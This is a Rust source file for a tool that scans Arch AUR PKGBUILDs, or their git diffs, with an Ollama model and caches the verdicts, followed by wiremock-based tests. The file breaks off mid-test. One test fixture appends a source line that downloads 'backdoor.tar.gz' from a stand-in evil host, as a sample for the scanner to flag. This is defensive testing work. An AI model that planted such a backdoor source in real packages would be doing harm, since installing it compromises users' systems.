//! Scanner orchestrator — ties together AurClient, OllamaClient, FileCache,
//! and extract modules into a unified scanning pipeline.
//!
//! The Scanner handles:
//! 1. Fetching PKGBUILDs from the AUR (with cache-awareness)
//! 2. Validating PKGBUILD content
//! 3. Sending to Ollama for security analysis
//! 4. Caching results
//! 5. Deduplication by PackageBase (shared bases scanned once)
//!
//! Backend-aware: branches on [`Backend::Yay`] (full PKGBUILD download)
//! and [`Backend::Paru`] (diff-based incremental scanning via [`DiffGenerator`]).

use std::collections::HashMap;

use crate::aur::AurClient;
use crate::cache::FileCache;
use crate::diff::DiffGenerator;
use crate::extract;
use crate::ollama::OllamaClient;
use crate::prompt::{self, get_prompt_for_backend};
use crate::types::{Backend, Config, PackageScan, ScanResult};

pub struct Scanner {
    aur: AurClient,
    ollama: OllamaClient,
    cache: FileCache,
    prompt: String,
    backend: Backend,
    diff_generator: Option<DiffGenerator>,
}

impl Scanner {
    pub fn new(config: &Config) -> Self {
        let backend = crate::config::detect_backend(config);
        let prompt = get_prompt_for_backend(config, &backend).to_string();
        let diff_generator = if backend == Backend::Paru {
            Some(DiffGenerator::new())
        } else {
            None
        };
        Self {
            aur: AurClient::new(),
            ollama: OllamaClient::new(config.ollama.endpoint.clone(), config.ollama.model.clone()),
            cache: FileCache::new(),
            prompt,
            backend,
            diff_generator,
        }
    }

    pub fn new_with_backend(config: &Config, backend: Backend) -> Self {
        let prompt = get_prompt_for_backend(config, &backend).to_string();
        let diff_generator = if backend == Backend::Paru {
            Some(DiffGenerator::new())
        } else {
            None
        };
        Self {
            aur: AurClient::new(),
            ollama: OllamaClient::new(config.ollama.endpoint.clone(), config.ollama.model.clone()),
            cache: FileCache::new(),
            prompt,
            backend,
            diff_generator,
        }
    }

    pub async fn scan_packages(&self, package_names: &[&str]) -> Result<Vec<PackageScan>, String> {
        match self.backend {
            Backend::Yay => self.scan_packages_yay(package_names).await,
            Backend::Paru => self.scan_packages_paru(package_names).await,
        }
    }

    async fn scan_packages_yay(&self, package_names: &[&str]) -> Result<Vec<PackageScan>, String> {
        let results = self
            .aur
            .fetch_pkgbuilds(&self.cache, package_names)
            .await?;

        // Phase 1: Build scan results map, deduplicating by PackageBase
        let mut scan_map: HashMap<String, ScanResult> = HashMap::new();

        for (pkg, pkgbuild_opt) in &results {
            let base = &pkg.package_base;
            if scan_map.contains_key(base) {
                continue;
            }

            let result = match pkgbuild_opt {
                Some(text) => {
                    // Cache miss — validate, scan, store
                    if let Err(e) = extract::validate_pkgbuild(text) {
                        ScanResult::Error(format!("PKGBUILD validation failed: {e}"))
                    } else {
                        match self.ollama.scan(text, &self.prompt).await {
                            Ok(scan_result) => {
                                self.cache.store_result(base, &pkg.version, &scan_result);
                                scan_result
                            }
                            Err(e) => ScanResult::Error(format!("Ollama scan failed: {e}")),
                        }
                    }
                }
                None => {
                    // Cache hit — retrieve from cache
                    self.cache
                        .check_cache(base, &pkg.version)
                        .unwrap_or_else(|| {
                            ScanResult::Error(
                                "cache inconsistency: cache hit but result missing".to_string(),
                            )
                        })
                }
            };

            scan_map.insert(base.clone(), result);
        }

        // Phase 2: Build output Vec, ordered by input
        let packages: Vec<PackageScan> = results
            .iter()
            .map(|(pkg, _)| PackageScan {
                name: pkg.name.clone(),
                base: pkg.package_base.clone(),
                version: pkg.version.clone(),
                result: scan_map.get(&pkg.package_base).cloned().unwrap_or_else(|| {
                    ScanResult::Error("internal error: scan result missing".to_string())
                }),
                decision: None,
            })
            .collect();

        Ok(packages)
    }

    async fn scan_packages_paru(
        &self,
        package_names: &[&str],
    ) -> Result<Vec<PackageScan>, String> {
        let pkgs = self.aur.query_packages(package_names).await?;

        // Build dedup map: PackageBase → ScanResult
        let mut scan_map: HashMap<String, ScanResult> = HashMap::new();

        for pkg in &pkgs {
            let base = &pkg.package_base;
            if scan_map.contains_key(base) {
                continue;
            }

            let dg = self
                .diff_generator
                .as_ref()
                .expect("DiffGenerator must be present in Paru mode");
            let diff_result = dg
                .generate_diff(base)
                .map_err(|e| format!("Diff generation failed for '{}': {}", base, e))?;

            let cache_commit_hash = diff_result.commit_hash.as_deref();

            // Check paru cache with commit_hash
            if let Some(cached) =
                self.cache
                    .get_paru_result(base, &pkg.version, cache_commit_hash)
            {
                scan_map.insert(base.clone(), cached);
                continue;
            }

            // Select prompt based on first-time status
            let selected_prompt = if diff_result.is_first_time {
                prompt::DEFAULT_PROMPT
            } else {
                prompt::PARU_DIFF_PROMPT
            };

            // SKIP validate_pkgbuild — diff text has +/- prefixes

            let scan_result = match self
                .ollama
                .scan(&diff_result.diff_text, selected_prompt)
                .await
            {
                Ok(result) => result,
                Err(e) => ScanResult::Error(format!("Ollama scan failed: {e}")),
            };

            self.cache.store_paru_result(
                base,
                &pkg.version,
                cache_commit_hash,
                &scan_result,
            );

            scan_map.insert(base.clone(), scan_result);
        }

        // Build output Vec, ordered by input
        let packages: Vec<PackageScan> = pkgs
            .iter()
            .map(|pkg| PackageScan {
                name: pkg.name.clone(),
                base: pkg.package_base.clone(),
                version: pkg.version.clone(),
                result: scan_map.get(&pkg.package_base).cloned().unwrap_or_else(|| {
                    ScanResult::Error("internal error: scan result missing".to_string())
                }),
                decision: None,
            })
            .collect();

        Ok(packages)
    }

    pub async fn scan_packages_batch(&self, names: &[&str]) -> Result<Vec<PackageScan>, String> {
        self.scan_packages(names).await
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::process::Command;
    use aur_fetch::Fetch;
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    // ── Helpers ───────────────────────────────────────────────────────────────

    fn create_test_tarball(pkg_name: &str, pkgbuild_content: &str) -> Vec<u8> {
        let mut tar_buffer = Vec::new();
        let mut tar_builder = tar::Builder::new(&mut tar_buffer);

        {
            let mut dir_header = tar::Header::new_gnu();
            dir_header.set_entry_type(tar::EntryType::Directory);
            dir_header.set_size(0);
            dir_header.set_mode(0o755);
            dir_header.set_cksum();
            tar_builder
                .append_data(&mut dir_header, format!("{pkg_name}/"), &[][..])
                .unwrap();
        }

        {
            let content = pkgbuild_content.as_bytes();
            let mut file_header = tar::Header::new_gnu();
            file_header.set_entry_type(tar::EntryType::Regular);
            file_header.set_size(content.len() as u64);
            file_header.set_mode(0o644);
            file_header.set_cksum();
            tar_builder
                .append_data(&mut file_header, format!("{pkg_name}/PKGBUILD"), content)
                .unwrap();
        }

        let tar_data = tar_builder.into_inner().unwrap();

        let mut gz_vec = Vec::new();
        {
            use flate2::write::GzEncoder;
            use flate2::Compression;
            let mut encoder = GzEncoder::new(&mut gz_vec, Compression::default());
            encoder.write_all(&tar_data).unwrap();
            encoder.finish().unwrap();
        }
        gz_vec
    }

    fn test_scanner(server: &MockServer, cache_dir: &std::path::Path) -> Scanner {
        Scanner {
            aur: AurClient::with_client(reqwest::Client::new(), server.uri()),
            ollama: OllamaClient::with_client(
                reqwest::Client::new(),
                server.uri(),
                "test-model".into(),
            ),
            cache: FileCache::with_dir(cache_dir.to_path_buf()),
            prompt: "audit this PKGBUILD".to_string(),
            backend: Backend::Yay,
            diff_generator: None,
        }
    }

    async fn mount_aur_rpc(server: &MockServer, packages: serde_json::Value) {
        let body = serde_json::json!({ "results": packages });
        Mock::given(method("GET"))
            .and(path("/rpc/v5/info"))
            .respond_with(ResponseTemplate::new(200).set_body_json(body))
            .mount(server)
            .await;
    }

    async fn mount_tarball(
        server: &MockServer,
        url_path: &str,
        pkg_name: &str,
        content: &str,
        expect: u64,
    ) {
        let tarball = create_test_tarball(pkg_name, content);
        Mock::given(method("GET"))
            .and(path(url_path))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(tarball))
            .expect(expect)
            .mount(server)
            .await;
    }

    async fn mount_ollama_clean(server: &MockServer, expect: u64) {
        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .respond_with(ResponseTemplate::new(200).set_body_json(
                serde_json::json!({"response": "VERDICT: CLEAN\n\nThis appears safe."}),
            ))
            .expect(expect)
            .mount(server)
            .await;
    }

    async fn mount_ollama_suspicious(server: &MockServer, expect: u64) {
        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .respond_with(ResponseTemplate::new(200).set_body_json(
                serde_json::json!({"response": "VERDICT: SUSPICIOUS\nFINDING: suspicious source URL\nFINDING: base64 encoded payload"}),
            ))
            .expect(expect)
            .mount(server)
            .await;
    }

    // ── Git helpers for paru test repos ──────────────────────────────────────

    fn git(dir: &std::path::Path, args: &[&str]) {
        let canonical = dir.canonicalize().unwrap_or_else(|e| {
            panic!("cannot resolve {}: {}", dir.display(), e)
        });
        let out = Command::new("git")
            .current_dir(&canonical)
            .args(args)
            .output()
            .unwrap_or_else(|e| panic!("git {:?} failed in {}: {}", args, canonical.display(), e));
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            panic!(
                "git {:?} returned non-zero in {}:\n{}",
                args,
                canonical.display(),
                stderr
            );
        }
    }

    fn setup_paru_repo(
        pkgbase: &str,
        pkgbuild_content: &str,
        seen: bool,
    ) -> (tempfile::TempDir, DiffGenerator) {
        let tmp = tempfile::tempdir().unwrap();
        let bare_root = tmp.path().join("bare");
        std::fs::create_dir_all(&bare_root).unwrap();
        let upstream = bare_root.join(pkgbase);

        // 1. Bare upstream
        std::fs::create_dir_all(&upstream).unwrap();
        git(&upstream, &["init", "--bare", "--initial-branch=master"]);

        // 2. Working tree → push v1 to bare
        let work = tmp.path().join("work");
        std::fs::create_dir_all(&work).unwrap();
        git(&work, &["init", "--initial-branch=master"]);
        std::fs::write(work.join("PKGBUILD"), pkgbuild_content).unwrap();
        git(&work, &["add", "PKGBUILD"]);
        git(&work, &["commit", "-m", "v1: initial PKGBUILD"]);
        git(
            &work,
            &[
                "remote",
                "add",
                "origin",
                &format!("file://{}", upstream.display()),
            ],
        );
        git(&work, &["push", "-u", "origin", "master"]);

        if seen {
            let clone = tmp.path().join("clone-tag");
            git(
                &tmp.path(),
                &[
                    "clone",
                    &format!("file://{}", upstream.display()),
                    clone.to_str().unwrap(),
                ],
            );
            git(&clone, &["tag", "AUR_SEEN"]);
            git(&clone, &["push", "origin", "AUR_SEEN"]);

            let amended = format!(
                "{}\nsource=('https://evil.example.com/backdoor.tar.gz')\n",
                pkgbuild_content
            );
            std::fs::write(clone.join("PKGBUILD"), amended).unwrap();
            git(&clone, &["add", "PKGBUILD"]);
            git(&clone, &["commit", "-m", "v2: add suspicious source"]);
            git(&clone, &["push", "origin", "master"]);
        }

        // 3. DiffGenerator with test-local clone dir (avoids sharing
        //    ~/.cache/paru/clone/ across test runs)
        let clone_dir = tmp.path().join("paru-clone");
        let mut fetch = Fetch::with_combined_cache_dir(&clone_dir);
        fetch.aur_url = format!("file://{}", bare_root.display())
            .parse()
            .expect("invalid aur_url");
        let dg = DiffGenerator { fetch };

        (tmp, dg)
    }

    fn test_scanner_paru(
        server: &MockServer,
        cache_dir: &std::path::Path,
        dg: DiffGenerator,
    ) -> Scanner {
        Scanner {
            aur: AurClient::with_client(reqwest::Client::new(), server.uri()),
            ollama: OllamaClient::with_client(
                reqwest::Client::new(),
                server.uri(),
                "test-model".into(),
            ),
            cache: FileCache::with_dir(cache_dir.to_path_buf()),
            prompt: "audit this PKGBUILD".to_string(),
            backend: Backend::Paru,
            diff_generator: Some(dg),
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Yay-mode tests (original — must pass unchanged)
    // ═══════════════════════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_scan_packages_cache_hit() {
        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        let scanner = test_scanner(&server, cache_dir.path());
        scanner
            .cache
            .store_result("cached-base", "1.0-1", &ScanResult::Clean);

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "cached-pkg",
                "PackageBase": "cached-base",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/cached-base.tar.gz",
                "Description": "Already cached"
            }]),
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/cached-base.tar.gz",
            "cached-base",
            "# Maintainer: Test\npkgname=cached-pkg\npkgver=1.0\n",
            0,
        )
        .await;

        mount_ollama_clean(&server, 0).await;

        let results = scanner.scan_packages(&["cached-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, "cached-pkg");
        assert_eq!(results[0].base, "cached-base");
        assert_eq!(results[0].version, "1.0-1");
        assert!(matches!(results[0].result, ScanResult::Clean));
        assert!(results[0].decision.is_none());
    }

    #[tokio::test]
    async fn test_scan_packages_cache_miss() {
        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();
        let scanner = test_scanner(&server, cache_dir.path());

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "new-pkg",
                "PackageBase": "new-base",
                "Version": "2.0-1",
                "URLPath": "/cgit/aur.git/snapshot/new-base.tar.gz",
                "Description": "Brand new package"
            }]),
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/new-base.tar.gz",
            "new-base",
            "# Maintainer: Dev\npkgname=new-pkg\npkgver=2.0\n",
            1,
        )
        .await;

        mount_ollama_clean(&server, 1).await;

        let results = scanner.scan_packages(&["new-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, "new-pkg");
        assert!(matches!(results[0].result, ScanResult::Clean));

        let cached = scanner.cache.check_cache("new-base", "2.0-1");
        assert!(matches!(cached, Some(ScanResult::Clean)));
    }

    #[tokio::test]
    async fn test_scan_packages_dedup() {
        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();
        let scanner = test_scanner(&server, cache_dir.path());

        mount_aur_rpc(
            &server,
            serde_json::json!([
                {
                    "Name": "libfoo",
                    "PackageBase": "shared-lib",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-lib.tar.gz",
                    "Description": "Library A"
                },
                {
                    "Name": "libfoo-dev",
                    "PackageBase": "shared-lib",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-lib.tar.gz",
                    "Description": "Library B (dev)"
                }
            ]),
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/shared-lib.tar.gz",
            "shared-lib",
            "# Maintainer: Shared\npkgname=libfoo\npkgver=3.0\n",
            1,
        )
        .await;

        mount_ollama_clean(&server, 1).await;

        let results = scanner
            .scan_packages(&["libfoo", "libfoo-dev"])
            .await
            .unwrap();

        assert_eq!(results.len(), 2);
        assert_eq!(results[0].name, "libfoo");
        assert_eq!(results[0].base, "shared-lib");
        assert!(matches!(results[0].result, ScanResult::Clean));

        assert_eq!(results[1].name, "libfoo-dev");
        assert_eq!(results[1].base, "shared-lib");
        assert!(matches!(results[1].result, ScanResult::Clean));

        match (&results[0].result, &results[1].result) {
            (ScanResult::Clean, ScanResult::Clean) => {}
            _ => panic!("both results should be Clean from dedup"),
        }
    }

    #[tokio::test]
    async fn test_scan_packages_partial_failure() {
        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();
        let scanner = test_scanner(&server, cache_dir.path());

        mount_aur_rpc(
            &server,
            serde_json::json!([
                {
                    "Name": "pkg-ok",
                    "PackageBase": "base-ok",
                    "Version": "1.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/base-ok.tar.gz",
                    "Description": "This one works"
                },
                {
                    "Name": "pkg-fail",
                    "PackageBase": "base-fail",
                    "Version": "1.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/base-fail.tar.gz",
                    "Description": "This one fails at Ollama level"
                }
            ]),
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/base-ok.tar.gz",
            "base-ok",
            "pkgname=pkg-ok\npkgver=1.0\n",
            1,
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/base-fail.tar.gz",
            "base-fail",
            "pkgname=pkg-fail\npkgver=1.0\n",
            1,
        )
        .await;

        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .and(wiremock::matchers::body_string_contains("pkg-ok"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_json(serde_json::json!({"response": "VERDICT: CLEAN\n"})),
            )
            .expect(1)
            .mount(&server)
            .await;

        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .and(wiremock::matchers::body_string_contains("pkg-fail"))
            .respond_with(ResponseTemplate::new(500))
            .expect(1)
            .mount(&server)
            .await;

        let results = scanner
            .scan_packages(&["pkg-ok", "pkg-fail"])
            .await
            .unwrap();

        assert_eq!(results.len(), 2);

        assert_eq!(results[0].name, "pkg-ok");
        assert!(matches!(results[0].result, ScanResult::Clean));

        assert_eq!(results[1].name, "pkg-fail");
        match &results[1].result {
            ScanResult::Error(_msg) => {}
            other => panic!("expected Error for pkg-fail, got {other:?}"),
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Paru-mode tests
    // ═══════════════════════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_paru_mode_diff_scan_clean() {
        let (_tmp, dg) = setup_paru_repo(
            "clean-pkg",
            "# Maintainer: Clean\npkgname=clean-pkg\npkgver=1.0\npkgrel=1\n",
            false,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "clean-pkg",
                "PackageBase": "clean-pkg",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/clean-pkg.tar.gz",
                "Description": "Clean package"
            }]),
        )
        .await;

        mount_ollama_clean(&server, 1).await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner.scan_packages(&["clean-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, "clean-pkg");
        assert!(matches!(results[0].result, ScanResult::Clean));
    }

    #[tokio::test]
    async fn test_paru_mode_diff_scan_suspicious() {
        let (_tmp, dg) = setup_paru_repo(
            "bad-pkg",
            "# Maintainer: Bad\npkgname=bad-pkg\npkgver=2.0\npkgrel=1\n",
            false,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "bad-pkg",
                "PackageBase": "bad-pkg",
                "Version": "2.0-1",
                "URLPath": "/cgit/aur.git/snapshot/bad-pkg.tar.gz",
                "Description": "Suspicious package"
            }]),
        )
        .await;

        mount_ollama_suspicious(&server, 1).await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner.scan_packages(&["bad-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, "bad-pkg");
        match &results[0].result {
            ScanResult::Suspicious { findings } => {
                assert!(!findings.is_empty());
            }
            other => panic!("expected Suspicious, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_paru_mode_skips_validation() {
        let (_tmp, dg) = setup_paru_repo(
            "skipval",
            "source=('https://example.com/src.tar.gz')\nsha256sums=('abc123')\n",
            false,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "skipval-pkg",
                "PackageBase": "skipval",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/skipval.tar.gz",
                "Description": "Validation-skip test"
            }]),
        )
        .await;

        mount_ollama_clean(&server, 1).await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner.scan_packages(&["skipval-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert!(matches!(results[0].result, ScanResult::Clean));
    }

    #[tokio::test]
    async fn test_paru_mode_first_time_uses_full_prompt() {
        let (_tmp, dg) = setup_paru_repo(
            "firsttime",
            "# Maintainer: FT\npkgname=firsttime\npkgver=1.0\npkgrel=1\n",
            false,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "firsttime",
                "PackageBase": "firsttime",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/firsttime.tar.gz",
                "Description": "First-time package"
            }]),
        )
        .await;

        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .and(wiremock::matchers::body_string_contains(
                "PKGBUILDs are bash scripts",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(
                serde_json::json!({"response": "VERDICT: CLEAN\n"}),
            ))
            .expect(1)
            .mount(&server)
            .await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner.scan_packages(&["firsttime"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert!(matches!(results[0].result, ScanResult::Clean));
    }

    #[tokio::test]
    async fn test_paru_mode_seen_package_uses_diff_prompt() {
        let (_tmp, dg) = setup_paru_repo(
            "seenpkg",
            "# Maintainer: SP\npkgname=seenpkg\npkgver=1.0\npkgrel=1\n",
            true,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "seenpkg",
                "PackageBase": "seenpkg",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/seenpkg.tar.gz",
                "Description": "Seen package with diff"
            }]),
        )
        .await;

        Mock::given(method("POST"))
            .and(path("/api/generate"))
            .and(wiremock::matchers::body_string_contains(
                "reviewing a GIT DIFF",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(
                serde_json::json!({"response": "VERDICT: CLEAN\n"}),
            ))
            .expect(1)
            .mount(&server)
            .await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner.scan_packages(&["seenpkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert!(matches!(results[0].result, ScanResult::Clean));
    }

    #[tokio::test]
    async fn test_paru_mode_cache_hit() {
        let tmp = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let pkgbase = "cachehit";
        let pkgbuild_content = "# Maintainer: CH\npkgname=cachehit\npkgver=1.0\npkgrel=1\n";

        // One shared upstream + clone dir
        let bare_root = tmp.path().join("bare");
        std::fs::create_dir_all(&bare_root).unwrap();
        let upstream = bare_root.join(pkgbase);
        std::fs::create_dir_all(&upstream).unwrap();
        git(&upstream, &["init", "--bare", "--initial-branch=master"]);

        let work = tmp.path().join("work");
        std::fs::create_dir_all(&work).unwrap();
        git(&work, &["init", "--initial-branch=master"]);
        std::fs::write(work.join("PKGBUILD"), pkgbuild_content).unwrap();
        git(&work, &["add", "PKGBUILD"]);
        git(&work, &["commit", "-m", "v1"]);
        git(&work, &["remote", "add", "origin", &format!("file://{}", upstream.display())]);
        git(&work, &["push", "-u", "origin", "master"]);

        let clone_dir = tmp.path().join("paru-clone");
        let aur_url_str = format!("file://{}", bare_root.display());

        let mk_dg = || {
            let mut fetch = Fetch::with_combined_cache_dir(&clone_dir);
            fetch.aur_url = aur_url_str.parse().unwrap();
            DiffGenerator { fetch }
        };

        // First scan: populate paru cache
        {
            let server = MockServer::start().await;
            mount_aur_rpc(&server, serde_json::json!([{
                "Name": pkgbase,
                "PackageBase": pkgbase,
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/cachehit.tar.gz",
                "Description": "Cache hit test"
            }])).await;
            mount_ollama_clean(&server, 1).await;

            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let _ = scanner.scan_packages(&[pkgbase]).await.unwrap();
        }

        // Second scan: same upstream, same clone dir → same commit hash → cache hit
        {
            let server = MockServer::start().await;
            mount_aur_rpc(&server, serde_json::json!([{
                "Name": pkgbase,
                "PackageBase": pkgbase,
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/cachehit.tar.gz",
                "Description": "Cache hit - second scan"
            }])).await;
            // Ollama should NOT be called (cache hit)
            mount_ollama_clean(&server, 0).await;

            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let results = scanner.scan_packages(&[pkgbase]).await.unwrap();

            assert_eq!(results.len(), 1);
            assert_eq!(results[0].name, pkgbase);
            assert!(matches!(results[0].result, ScanResult::Clean));
        }
    }

    #[tokio::test]
    async fn test_paru_mode_cache_miss_diff_hash() {
        let tmp = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let pkgbase = "hashmiss";

        let bare_root = tmp.path().join("bare");
        std::fs::create_dir_all(&bare_root).unwrap();
        let upstream = bare_root.join(pkgbase);
        std::fs::create_dir_all(&upstream).unwrap();
        git(&upstream, &["init", "--bare", "--initial-branch=master"]);

        // v1
        let work = tmp.path().join("work");
        std::fs::create_dir_all(&work).unwrap();
        git(&work, &["init", "--initial-branch=master"]);
        std::fs::write(work.join("PKGBUILD"), "# Maintainer: HM\npkgname=hashmiss\npkgver=1.0\npkgrel=1\n").unwrap();
        git(&work, &["add", "PKGBUILD"]);
        git(&work, &["commit", "-m", "v1"]);
        git(&work, &["remote", "add", "origin", &format!("file://{}", upstream.display())]);
        git(&work, &["push", "-u", "origin", "master"]);

        let clone_dir = tmp.path().join("paru-clone");
        let aur_url_str = format!("file://{}", bare_root.display());

        let mk_dg = || {
            let mut fetch = Fetch::with_combined_cache_dir(&clone_dir);
            fetch.aur_url = aur_url_str.parse().unwrap();
            DiffGenerator { fetch }
        };

        // First scan: v1 → populate cache
        {
            let server = MockServer::start().await;
            mount_aur_rpc(&server, serde_json::json!([{
                "Name": pkgbase,
                "PackageBase": pkgbase,
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/hashmiss.tar.gz",
                "Description": "Hash miss test - v1"
            }])).await;
            mount_ollama_clean(&server, 1).await;
            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let _ = scanner.scan_packages(&[pkgbase]).await.unwrap();
        }

        // v2: different content → different commit hash → cache miss → re-scan
        let work2 = tmp.path().join("work2");
        git(&tmp.path(), &["clone", &format!("file://{}", upstream.display()), work2.to_str().unwrap()]);
        std::fs::write(work2.join("PKGBUILD"), "# Maintainer: HM\npkgname=hashmiss\npkgver=2.0\npkgrel=1\nsource=('https://new.example.com/pkg.tar.gz')\n").unwrap();
        git(&work2, &["add", "PKGBUILD"]);
        git(&work2, &["commit", "-m", "v2"]);
        git(&work2, &["push", "origin", "master"]);

        {
            let server = MockServer::start().await;
            mount_aur_rpc(&server, serde_json::json!([{
                "Name": pkgbase,
                "PackageBase": pkgbase,
                "Version": "2.0-1",
                "URLPath": "/cgit/aur.git/snapshot/hashmiss.tar.gz",
                "Description": "Hash miss test - v2"
            }])).await;
            mount_ollama_clean(&server, 1).await;
            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let results = scanner.scan_packages(&[pkgbase]).await.unwrap();

            assert_eq!(results.len(), 1);
            assert_eq!(results[0].name, pkgbase);
            assert!(matches!(results[0].result, ScanResult::Clean));
        }
    }

    #[tokio::test]
    async fn test_paru_mode_dedup_shared_base() {
        let (_tmp, dg) = setup_paru_repo(
            "shared-base",
            "# Maintainer: SB\npkgname=shared-pkg\npkgver=3.0\npkgrel=1\n",
            false,
        );

        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        mount_aur_rpc(
            &server,
            serde_json::json!([
                {
                    "Name": "sub-pkg-a",
                    "PackageBase": "shared-base",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-base.tar.gz",
                    "Description": "Sub package A"
                },
                {
                    "Name": "sub-pkg-b",
                    "PackageBase": "shared-base",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-base.tar.gz",
                    "Description": "Sub package B"
                }
            ]),
        )
        .await;

        // Ollama should be called exactly ONCE
        mount_ollama_clean(&server, 1).await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), dg);
        let results = scanner
            .scan_packages(&["sub-pkg-a", "sub-pkg-b"])
            .await
            .unwrap();

        assert_eq!(results.len(), 2);
        assert_eq!(results[0].name, "sub-pkg-a");
        assert_eq!(results[0].base, "shared-base");
        assert!(matches!(results[0].result, ScanResult::Clean));

        assert_eq!(results[1].name, "sub-pkg-b");
        assert_eq!(results[1].base, "shared-base");
        assert!(matches!(results[1].result, ScanResult::Clean));
    }

    #[tokio::test]
    async fn test_yay_mode_regression_in_backend_aware_scanner() {
        let server = MockServer::start().await;
        let cache_dir = tempfile::tempdir().unwrap();

        let config = Config {
            ollama: crate::types::OllamaConfig {
                model: "test-model".into(),
                endpoint: server.uri(),
                prompt_override: None,
            },
            cache: crate::types::CacheConfig { ttl_hours: 24 },
            helper: Default::default(),
        };
        let mut scanner = Scanner::new_with_backend(&config, Backend::Yay);
        scanner.aur = AurClient::with_client(reqwest::Client::new(), server.uri());
        scanner.cache = FileCache::with_dir(cache_dir.path().to_path_buf());

        scanner
            .cache
            .store_result("yay-reg-base", "1.0-1", &ScanResult::Clean);

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": "yay-reg-pkg",
                "PackageBase": "yay-reg-base",
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/yay-reg-base.tar.gz",
                "Description": "Yay regression test"
            }]),
        )
        .await;

        mount_tarball(
            &server,
            "/cgit/aur.git/snapshot/yay-reg-base.tar.gz",
            "yay-reg-base",
            "# Maintainer: YR\npkgname=yay-reg-pkg\npkgver=1.0\n",
            0,
        )
        .await;

        mount_ollama_clean(&server, 0).await;

        let results = scanner.scan_packages(&["yay-reg-pkg"]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, "yay-reg-pkg");
        assert_eq!(results[0].base, "yay-reg-base");
